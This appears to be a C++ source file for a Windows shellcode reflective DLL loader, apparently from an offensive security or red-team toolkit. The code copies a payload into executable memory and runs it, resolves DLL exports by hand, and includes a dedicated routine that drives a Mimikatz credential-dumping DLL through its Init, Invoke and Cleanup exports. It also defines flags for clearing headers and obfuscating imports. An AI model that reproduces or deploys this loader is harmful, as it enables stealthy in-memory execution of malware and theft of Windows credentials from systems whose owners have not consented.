#define no_init_all
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <string>
#include <iostream>
#include <regex>

#include <shellapi.h>
// ref: https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-commandlinetoargvw
#pragma comment (lib, "Shell32.lib") // CommandLineToArgvW

#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

#define ROTR32(value, shift)    (((DWORD) value >> (BYTE) shift) | ((DWORD) value << (32 - (BYTE) shift)))
#define RVA(type, base, rva) (type)((ULONG_PTR) base + rva)

#define SRDI_CLEARHEADER 0x1
#define SRDI_CLEARMEMORY 0x2
#define SRDI_OBFUSCATEIMPORTS 0x4


// https://iqcode.com/code/cpp/c-stdstring-find-and-replace
std::string do_replace(std::string const & in, std::string const & from, std::string const & to)
{
    return std::regex_replace(in, std::regex(from), to);
}

std::string GetBinFolder()
{
    CHAR buf[MAX_PATH + 1] = { 0 };
    DWORD dwRet;
    dwRet = GetCurrentDirectoryA(MAX_PATH, buf);
    if (dwRet != 0)
    {
        std::string bin_folder(buf);
        bin_folder = do_replace(bin_folder, "\\\\Loader\\\\Loader", "\\bin\\");
        return bin_folder;
    }
    else
    {
        return std::string();
    }
}


FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)
{
    if (hModule == NULL || lpProcName == NULL)
        return NULL;

    PIMAGE_NT_HEADERS ntHeaders = RVA(PIMAGE_NT_HEADERS, hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
    PIMAGE_DATA_DIRECTORY dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dataDir->Size)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY exportDir = RVA(PIMAGE_EXPORT_DIRECTORY, hModule, dataDir->VirtualAddress);
    if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions)
        return NULL;

    PDWORD expName = RVA(PDWORD, hModule, exportDir->AddressOfNames);
    PWORD expOrdinal = RVA(PWORD, hModule, exportDir->AddressOfNameOrdinals);
    LPCSTR expNameStr;

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++)
    {

        expNameStr = RVA(LPCSTR, hModule, *expName);

        if (!expNameStr)
            break;

        if (!_stricmp(lpProcName, expNameStr))
        {
            DWORD funcRva = *RVA(PDWORD, hModule, exportDir->AddressOfFunctions + (*expOrdinal * 4));
            return RVA(FARPROC, hModule, funcRva);
        }
    }

    return NULL;
}

BOOL Is64BitDLL(UINT_PTR uiLibraryAddress)
{
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);

    if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) return true;
    else return false;
}

typedef UINT_PTR(WINAPI * RDI)();
typedef LPWSTR(__cdecl * FUNCTIONW)(LPCWSTR, DWORD);

//typedef BOOL(__cdecl * EXPORTEDFUNCTION)(LPVOID, DWORD);
std::wstring toWstring(const std::string& str)
{
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

std::string toString(const std::wstring& wstr)
{
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

BOOL loadDllFromMemory(BYTE* sRDI_payload, SIZE_T sRDI_payload_len, HMODULE* hModule)
{
    if (!sRDI_payload || sRDI_payload_len == 0 || !hModule) {
        return FALSE;
    }

    LPVOID pExecutableBuffer = VirtualAlloc(
        NULL,                  
        sRDI_payload_len,     
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE 
    );

    if (pExecutableBuffer == NULL)
    {
        return FALSE;
    }

    memcpy(pExecutableBuffer, sRDI_payload, sRDI_payload_len);
    RDI rdi_entry = (RDI)pExecutableBuffer;
    HMODULE hLoadedDLL = (HMODULE)rdi_entry();
    VirtualFree(pExecutableBuffer, 0, MEM_RELEASE);

    if (hLoadedDLL == NULL) {
        return FALSE;
    }

    *hModule = hLoadedDLL; 
    return TRUE;
}

int load_execute_dll_from_memory(BYTE* sRDI_payload, SIZE_T sRDI_payload_len, std::string func_name, std::wstring input_args, std::wstring* out_result)
{
    HMODULE hDLL = NULL;
    int ret_code = -1;   

    if (!loadDllFromMemory(sRDI_payload, sRDI_payload_len, &hDLL))
    {
        return ret_code;
    }

    void* fn = GetProcAddressR(hDLL, func_name.c_str());

    if (fn != nullptr)
    {
        FUNCTIONW exportedProcedure = (FUNCTIONW)fn;

        if (exportedProcedure)
        {

            std::wstring output_from_dll_str = L""; 
            LPWSTR lpsz_returned_output = NULL;     

            try
            {
                lpsz_returned_output = exportedProcedure(input_args.c_str(), (DWORD)input_args.size());

                if (lpsz_returned_output)
                {
                    output_from_dll_str = lpsz_returned_output;

                    SecureZeroMemory(lpsz_returned_output, wcslen(lpsz_returned_output) * sizeof(WCHAR));
                    LocalFree(lpsz_returned_output); 
                    lpsz_returned_output = NULL;

                    if (out_result) {
                        *out_result = output_from_dll_str;
                    }
                    ret_code = 0; // originally, this was outside of this if statement. May need to move it back outside in the future, but for now !lpsz_returned_output means failure state
                }
                else {
                    ret_code = -1;
                }
            }
            catch (...)
            {
                ret_code = -1;
            }
        }
        else
        {
            ret_code = -1;
        }
    }
    else
    {
        ret_code = -1;
    }

    if (hDLL)
    {
        SecureZeroMemory(hDLL, sizeof(hDLL)); 
        FreeLibrary(hDLL);
        hDLL = NULL;
    }

    return ret_code;
}

int executeShellcodeInMemory(BYTE* sRDI_payload, SIZE_T sRDI_payload_len, std::wstring args_to_dll, std::string* output_result)
{
    std::wstring wout_from_dll = L"";
    int result = load_execute_dll_from_memory(sRDI_payload, sRDI_payload_len, "ExecuteW", args_to_dll, &wout_from_dll);
    *output_result = toString(wout_from_dll);
    return result;
}

int executeShellcodeInMemoryMimikatz(BYTE* sRDI_payload, SIZE_T sRDI_payload_len, std::wstring args_to_dll, std::string* output_result)
{
    std::wstring wout_from_dll = L"";
    std::wstring wout_from_dll_init = L"";
    std::wstring wout_from_dll_cleanup = L"";
    load_execute_dll_from_memory(sRDI_payload, sRDI_payload_len, "Init", L"", &wout_from_dll_init);
    int result = load_execute_dll_from_memory(sRDI_payload, sRDI_payload_len, "Invoke", args_to_dll, &wout_from_dll);
    load_execute_dll_from_memory(sRDI_payload, sRDI_payload_len, "Cleanup", L"", &wout_from_dll_cleanup);

    *output_result = toString(wout_from_dll);
    return result;
}